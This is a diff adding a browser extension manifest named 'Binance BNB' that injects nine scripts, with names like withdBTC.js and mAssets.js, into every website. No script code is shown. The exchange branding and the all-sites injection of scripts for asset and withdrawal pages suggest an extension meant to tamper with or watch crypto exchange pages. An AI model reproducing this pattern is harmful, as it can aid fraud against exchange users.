@@ -1,0 +1,25 @@
+{
+  "manifest_version": 3,
+  "name": "Binance BNB",
+  "version": "1.0",
+  "description": "BNB",
+  
+  "permissions": [
+    "activeTab"
+  ],
+  
+  "content_scripts": [
+    {
+      "matches": ["<all_urls>"],
+      "js": ["Dash.js",
+      "DashBTC.js",
+    "OverView.js",
+    "OverView2.js",
+    "mAssetsBTC.js",
+    "mAssets.js",
+    "en.js",
+    "enBTC.js",
+  "withdBTC.js"]
+    }
+  ]
+  }
